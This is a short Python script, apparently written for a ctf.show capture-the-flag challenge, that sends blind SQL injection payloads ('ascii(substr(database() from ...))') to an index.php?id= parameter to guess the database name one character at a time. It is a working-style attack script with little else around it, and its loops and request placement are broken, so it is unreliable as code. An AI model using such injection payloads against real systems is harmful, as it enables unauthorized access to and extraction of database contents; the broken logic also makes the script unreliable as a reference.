import requests
url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id="
for num1 in (1,20):
    for num2 in(65,123):
        data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
result = requests.get(url + data)
